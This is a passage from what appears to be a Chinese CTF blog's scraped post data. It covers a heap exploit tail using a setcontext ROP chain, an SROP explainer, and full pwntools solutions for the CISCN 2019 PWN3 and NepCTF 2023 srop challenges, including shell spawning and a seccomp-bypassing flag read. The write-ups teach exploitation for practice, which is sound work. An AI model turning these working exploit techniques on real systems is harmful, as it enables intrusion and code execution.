#28   payload += p64(heap_base + 0x20a0) #38      payload += p64(heap_base + 0x2000) #48payload += p64(heap_base + 0x1000) #58payload += p64(0) #68payload += p64(heap_base + 0x1000+0x58)#78edit(0,payload)pop_rax_ret = libc_base+0x0000000000043ae8pop_rdi_ret = libc_base+0x00000000000215bfpop_rsi_ret = libc_base+0x0000000000023eeapop_rdx_ret = libc_base+0x0000000000001b96ret = libc_base+0x0000000000023eebopen1 = libc_base + libc.sym[&#x27;open&#x27;]read = libc_base + libc.sym[&#x27;read&#x27;]write = libc_base + libc.sym[&#x27;write&#x27;]alarm = libc_base + libc.sym[&#x27;alarm&#x27;]syscall = alarm+0x5flag_addr = heap_base+0x2000success(&quot;libc base:%s&quot;, hex(libc_base))success(&quot;setcontext_53:%s&quot;, hex(setcontext))success(&quot;free_hook:%s&quot;, hex(free_hook))# rop chainrop = p64(pop_rdi_ret)+p64(flag_addr)rop += p64(pop_rsi_ret)+p64(0)rop += p64(pop_rax_ret)+p64(2)rop += p64(syscall)rop += p64(pop_rdi_ret)+p64(3)rop += p64(pop_rsi_ret)+p64(flag_addr)rop += p64(pop_rdx_ret)+p64(0x30)rop += p64(pop_rax_ret)+p64(0)rop += p64(syscall)rop += p64(pop_rdi_ret)+p64(1)rop += p64(pop_rsi_ret)+p64(flag_addr)rop += p64(pop_rdx_ret)+p64(0x30)rop += p64(pop_rax_ret)+p64(1)rop += p64(syscall)add(0,0x18)edit(0,p64(setcontext))  #hijack  free_hook  to setcontext+53add(0,0x28)edit(0,b&#x27;./flag\\x00\\x00&#x27;)  #./flag in heap + 0x2000  -- rdiadd(0,0x38)edit(0,p64(heap_base + 0x1000) + p64(ret))  # mov rsp , [rdi+0a0h]# rop in heap+0x10000add(0,0x58)edit(0,rop[:0x58])add(0,0x78)edit(0,rop[0x58:])# setcontext(rop)add(0,0x48)free(0)p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"初探srop","url":"/2023/08/13/srop/","content":"signal 机制signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。\n┌──(str1d3r㉿str1k3Gwindows)-[~]└─$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR111) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+338) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+843) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+1348) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-1253) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-758) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-263) SIGRTMAX-1  64) SIGRTMAX\n内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。\n内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontextx86\nstruct sigcontext&#123;  unsigned short gs, __gsh;  unsigned short fs, __fsh;  unsigned short es, __esh;  unsigned short ds, __dsh;  unsigned long edi;  unsigned long esi;  unsigned long ebp;  unsigned long esp;  unsigned long ebx;  unsigned long edx;  unsigned long ecx;  unsigned long eax;  unsigned long trapno;  unsigned long err;  unsigned long eip;  unsigned short cs, __csh;  unsigned long eflags;  unsigned long esp_at_signal;  unsigned short ss, __ssh;  struct _fpstate * fpstate;  unsigned long oldmask;  unsigned long cr2;&#125;;\nx64\nstruct _fpstate&#123;  /* FPU environment matching the 64-bit FXSAVE layout.  */  __uint16_t        cwd;  __uint16_t        swd;  __uint16_t        ftw;  __uint16_t        fop;  __uint64_t        rip;  __uint64_t        rdp;  __uint32_t        mxcsr;  __uint32_t        mxcr_mask;  struct _fpxreg    _st[8];  struct _xmmreg    _xmm[16];  __uint32_t        padding[24];&#125;;struct sigcontext&#123;  __uint64_t r8;  __uint64_t r9;  __uint64_t r10;  __uint64_t r11;  __uint64_t r12;  __uint64_t r13;  __uint64_t r14;  __uint64_t r15;  __uint64_t rdi;  __uint64_t rsi;  __uint64_t rbp;  __uint64_t rbx;  __uint64_t rdx;  __uint64_t rax;  __uint64_t rcx;  __uint64_t rsp;  __uint64_t rip;  __uint64_t eflags;  unsigned short cs;  unsigned short gs;  unsigned short fs;  unsigned short __pad0;  __uint64_t err;  __uint64_t trapno;  __uint64_t oldmask;  __uint64_t cr2;  __extension__ union    &#123;      struct _fpstate * fpstate;      __uint64_t __fpstate_word;    &#125;;  __uint64_t __reserved1 [8];&#125;;\nsignal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。\n仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：\nSignal Frame 被保存在用户的地址空间中，所以用户是可以读写的。由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。说到这里，其实，SROP 的基本利用原理也就出现了。获取 shell首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。system call chains需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可控制栈指针。把原来 rip 指向的syscall gadget 换成syscall; ret gadget。这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。后续 ¶需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件可以通过栈溢出来控制栈的内容需要知道相应的地址“&#x2F;bin&#x2F;sh”Signal Framesyscallsigreturn需要有够大的空间来塞下整个 sigal frame\n以上介绍来自CTFwikipwntools已集成srop攻击\n[CISCN 2019华南]PWN3 #复现环境ubuntu 20.04\nstr1k3@ubuntu:~/Desktop$ checksec &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27; [*] &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n保护没特别的\nsigned __int64 vuln()&#123;  signed __int64 v0; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_read(0, buf, 0x400uLL);  return sys_write(1u, buf, 0x30uLL); //打印出栈地址&#125;\n给了gadget\n.text:00000000004004D6                               public gadgets.text:00000000004004D6                               gadgets proc near.text:00000000004004D6                               ; __unwind &#123;.text:00000000004004D6 55                            push    rbp.text:00000000004004D7 48 89 E5                      mov     rbp, rsp.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh.text:00000000004004E1 C3                            retn.text:00000000004004E1.text:00000000004004E1                               gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2                               ; ---------------------------------------------------------------------------.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 C3                            retn.text:00000000004004E9.text:00000000004004E9                               ; ---------------------------------------------------------------------------.text:00000000004004EA 90                            db 90h.text:00000000004004EB                               ; ---------------------------------------------------------------------------.text:00000000004004EB 5D                            pop     rbp.text:00000000004004EC C3                            retn.text:00000000004004EC                               ; &#125; // starts at 4004D6\n有mov rax，0xf,显然进行srop要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值bin_sh字符串的地址需要把bin_sh写到栈上 然后利用write函数泄露栈地址\npwndbg&gt; x/40gx 0x7fffffffe3300x7fffffffe330:\t0x6161616161616161*\t0x000000000040050a 0x7fffffffe340:\t0x00007fffffffe360\t0x00000000004005360x7fffffffe350:\t0x00007fffffffe458*\t0x0000000100000000 0x7fffffffe360:\t0x0000000000000000\t0x00007ffff7de80830x7fffffffe370:\t0x00007ffff7ffc620\t0x00007fffffffe4580x7fffffffe380:\t0x0000000100000000\t0x000000000040051d0x7fffffffe390:\t0x0000000000400540\t0xb0a1866950c4d5040x7fffffffe3a0:\t0x00000000004003e0\t0x00007fffffffe4500x7fffffffe3b0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3c0:\t0x4f5e79969624d504\t0x4f5e69d450aad5040x7fffffffe3d0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3e0:\t0x0000000000000000\t0x00000000000000010x7fffffffe3f0:\t0x00007fffffffe458\t0x00007fffffffe4680x7fffffffe400:\t0x00007ffff7ffe190\t0x00000000000000000x7fffffffe410:\t0x0000000000000000\t0x00000000004003e00x7fffffffe420:\t0x00007fffffffe450\t0x00000000000000000x7fffffffe430:\t0x0000000000000000\t0x00000000004004090x7fffffffe440:\t0x00007fffffffe448\t0x000000000000001c0x7fffffffe450:\t0x0000000000000001\t0x00007fffffffe6d40x7fffffffe460:\t0x0000000000000000\t0x00007fffffffe709\n输入的8字节的字母a位于0x7fffffffe330,0x7fffffffe350处有一个0x00007fffffffe458的地址可以泄露\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p = process(&quot;./pwn3&quot;)p = remote(&quot;node1.anna.nssctf.cn&quot;,28856)elf = ELF(&quot;./pwn3&quot;)syscall = 0x400501syscall_ret = 0x400517gadget = 0x4004DAvuln = 0x4004ED#泄露栈地址p.send(b&#x27;a&#x27;*0x10+p64(vuln))p.recv(0x20)stack = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) -0x118print(&quot;stack -&gt; &quot; + hex(stack))#sropframe = SigreturnFrame()frame.rax = 59frame.rdi = stackframe.rip = syscallframe.rsi = 0payload = b&quot;/bin/sh\\x00&quot;*0x2 + p64(gadget) + p64(syscall) + bytes(frame)p.send(payload)p.interactive()\n\n[NepCTF 2023] srop[NepCTF2023]srop给了源码  \n//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char buf[0x30]=&quot;welcome to NepCTF2023!\\n&quot;;int seccomp()&#123;    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);    seccomp_load(ctx);    return 0;&#125;//沙盒int sys()&#123;    return 15;&#125;//syscallint main()&#123;     char bd[0x30];     seccomp();     syscall(1,1,buf,0x30); //write(&quot;welcome to NepCTF2023!\\n&quot;)     return syscall(0,0,bd,0x300);  //read(bd,0x300)&#125;//主函数\n查保护\npwndbg&gt; checksec[*] &#x27;/home/str1k3/Desktop/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\n沙盒，但是允许了orw\npwndbg&gt; search flagSearching for value: &#x27;flag&#x27;libc-2.27.so    0x7ffff77d4a3b insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7505 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7906 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff79736a0 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff7979b44 insb byte ptr [rdi], dx /* &#x27;flags2 &amp; _IO_FLAGS2_FORTIFY&#x27; */libc-2.27.so    0x7ffff79b0282 &#x27;flags is not implemented and will always fail&#x27;warning: Unable to access 16003 bytes of target memory at 0x7ffff79b0286, halting search.warning: Unable to access 16003 bytes of target memory at 0x7ffff7bd1000, halting search.ld-2.27.so      0x7ffff7df6421 insb byte ptr [rdi], dx /* &#x27;flag)&#x27; */ld-2.27.so      0x7ffff7df6efe insb byte ptr [rdi], dx /* &#x27;flag value(s) of 0x%x in DT_FLAGS_1.\\n&#x27; */ld-2.27.so      0x7ffff7df77d4 insb byte ptr [rdi], dx /* &#x27;flags &amp; ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0&#x27; */ld-2.27.so      0x7ffff7df844e insb byte ptr [rdi], dx /* &#x27;flags_1 &amp; DF_1_NODELETE) == 0&#x27; */\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# io = process(&quot;./pwn&quot;)p = remote(&quot;nepctf.1cepeak.cn&quot;, 31943)mov_eax_15 = 0x0000400754   #0x0000000000400754 : mov eax, 0xf ; pop rbp ; retbuf = 0x00000601050         #.bss:0000000000601050ret = 0x004007AE            #.text:00000000004007AD C9                            leave                            #.text:00000000004007AE C3                            retnsyscall = 0x0004005B0       #.plt:00000000004005B0                               ; [00000006 BYTES: COLLAPSED FUNCTION _syscall. PRESS CTRL-NUMPAD+ TO EXPAND]pop_rdi = 0x0000000000400813    #0x0000000000400813 : pop rdi ; retstack = 0x0601a50#开出一个栈frame = SigreturnFrame()frame.rdi = 0frame.rsi = 0frame.rdx = stack-0x8frame.rcx = 0x1000frame.rip = syscallframe.rsp = stackpayload = b&quot;a&quot; * (0x0030+8) + flat([    pop_rdi,    15,    syscall]) + bytes(frame)p.send(payload)sleep(1)#orwframe = SigreturnFrame()frame.rdi = 2frame.rsi = stack-0x8frame.rdx = 0frame.rcx = 0x1000frame.rip = syscallframe.rsp = stack + 0x110payload = b&quot;./flag\\x00\\x00&quot; + flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 0frame.rsi = 3frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 1frame.rsi = 1frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) log.success(f&quot;length &#123;len(payload):#x&#125;&quot;)p.send(payload)p.interactive()","categories":["stack"],"tags":["rop"]}]